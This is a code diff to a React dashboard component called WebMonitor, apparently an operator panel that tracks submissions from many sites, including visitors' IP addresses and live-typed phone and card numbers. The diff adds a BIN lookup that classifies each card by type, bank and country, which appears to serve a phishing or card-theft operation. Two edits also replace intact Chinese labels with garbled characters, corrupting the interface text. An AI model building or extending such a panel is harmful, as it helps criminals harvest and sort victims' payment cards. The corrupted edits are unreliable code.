@@ -20,6 +20,12 @@ interface UserSubmission {
   fieldsCount?: number;
   ipAddress?: string;
   sessionId?: string;
+  // Bin查询结果
+  binLookup?: {
+    cardType: "debit" | "credit" | "prepaid" | "unknown";
+    bank?: string;
+    country?: string;
+  };
   realtimeInput?: {
     phone?: string;
     cardNumber?: string;
@@ -298,7 +304,7 @@ export function WebMonitor() {
                   {submission.progress ? (
                     <div className="min-w-[180px]">
                       <div className="flex justify-between text-xs mb-1">
-                        <span className="text-muted-foreground">处理进度</span>
+                        <span className="text-muted-foreground">处���进度</span>
                         <span className="font-medium text-blue-600">{submission.progressText}</span>
                       </div>
                       <Progress value={submission.progress} className="h-2" />
@@ -356,7 +362,7 @@ export function WebMonitor() {
         {/* Bottom Summary */}
         <div className="mt-6 pt-4 border-t border-border">
           <div className="text-xs text-muted-foreground">
-            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
+            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证��过率 82%
           </div>
         </div>
       </div>
